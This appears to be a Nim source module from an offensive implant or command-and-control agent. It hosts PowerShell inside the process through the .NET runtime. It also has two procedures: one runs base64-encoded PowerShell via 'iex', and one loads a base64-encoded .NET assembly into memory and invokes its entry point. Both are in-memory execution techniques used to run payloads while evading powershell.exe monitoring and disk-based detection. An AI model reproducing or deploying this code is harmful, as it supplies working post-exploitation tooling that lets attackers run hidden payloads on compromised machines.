import std/[strformat, strutils]
import winim/[clr]
import os


proc execute_encoded_powershell*(encoded_command: string): string =
    var output: string
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
    var runspace = @RunspaceFactory.CreateRunspace()
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(fmt"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded_command}')))")
    pipeline.Commands.Add("Out-String")
    var results = pipeline.Invoke()
    for i in countUp(0, results.Count()-1):
        output.add($results.Item(i))
    runspace.Close()
    return output.replace("\c", "")


proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, string) =

    var is_success: bool
    var output: string
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
    var runspace = @RunspaceFactory.CreateRunspace()
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(fmt"""
    $assembly_b64 = "{assembly_b64}"
    $assembly_args = "{assembly_args}"
    $assembly_bytes = [System.Convert]::FromBase64String($assembly_b64)
    $assembly = [Reflection.Assembly]::Load($assembly_bytes)
    $params = @(,[String[]]$assembly_args.Split(" "))
    $assembly.EntryPoint.invoke($null, $params)
    """)
    pipeline.Commands.Add("Out-String")
    var results = pipeline.Invoke()
    for i in countUp(0, results.Count()-1):
        output.add($results.Item(i))
    runspace.Close()

    return (is_success, output.replace("\c", ""))

